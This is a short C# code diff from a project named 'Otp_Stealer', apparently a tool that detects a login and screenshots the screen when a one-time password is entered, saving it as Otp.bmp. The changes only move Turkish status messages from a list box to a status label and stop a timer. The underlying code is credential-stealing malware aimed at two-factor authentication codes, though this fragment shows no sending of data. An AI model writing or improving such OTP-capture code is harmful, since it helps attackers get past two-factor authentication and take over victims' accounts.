@@ -129,7 +129,7 @@ namespace Otp_Stealer
 
             if (success == true)
             {
-                listIslemler.Items.Add("Login Algılandı");
+                lblStatus.Text = "Status : " + ("Login Algılandı");
                 return;
             }
 
@@ -145,7 +145,7 @@ namespace Otp_Stealer
 
                 if (otpGirilmedi == true)
                 {
-                    listIslemler.Items.Add("Otp Girilmedi");
+                    lblStatus.Text = "Status : " + ("Otp Girilmedi");
                     return;
                 }
                 else
@@ -153,7 +153,9 @@ namespace Otp_Stealer
                     bmpScreenshot.Save(Application.StartupPath + "\\Otp.bmp");
 
 
-                    listIslemler.Items.Add("Otp Girildi");
+                    lblStatus.Text = "Status : " + ("Otp Girildi");
+                    tmrSystem.Enabled = false;
+
                     return;
                 }
                 
